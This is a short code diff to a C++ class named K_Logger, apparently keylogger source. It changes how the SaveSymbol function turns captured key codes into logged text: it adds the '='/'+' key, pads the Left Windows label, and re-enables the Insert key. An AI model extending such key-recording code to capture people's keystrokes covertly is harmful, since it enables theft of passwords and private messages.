@@ -31,6 +31,17 @@ int K_Logger::SaveSymbol(WORD iKey)
 {
 	switch (iKey)
 	{
+	case 187:
+		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
+		{
+			cout << "+";
+		}
+		else
+		{
+			cout << "=";
+		}
+		break;
+
 	case 48:
 		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
 		{
@@ -671,8 +682,8 @@ int K_Logger::SaveSymbol(WORD iKey)
 
 
 	case VK_LWIN:
-		cout << "Left_Win";
-		WriteToDoc("Left_Win");
+		cout << " Left_Win ";
+		WriteToDoc(" Left_Win ");
 		break;
 
 
@@ -766,10 +777,10 @@ int K_Logger::SaveSymbol(WORD iKey)
 		WriteToDoc(" btn_ctrl ");
 		break;
 
-		//case VK_INSERT:
-		//	cout << " Insert ";
-		//	WriteToDoc(" Insert ");
-		//	break;
+		case VK_INSERT:
+			cout << " Insert ";
+			WriteToDoc(" Insert ");
+			break;
 
 	case VK_DELETE:
 		cout << " *Delete* ";
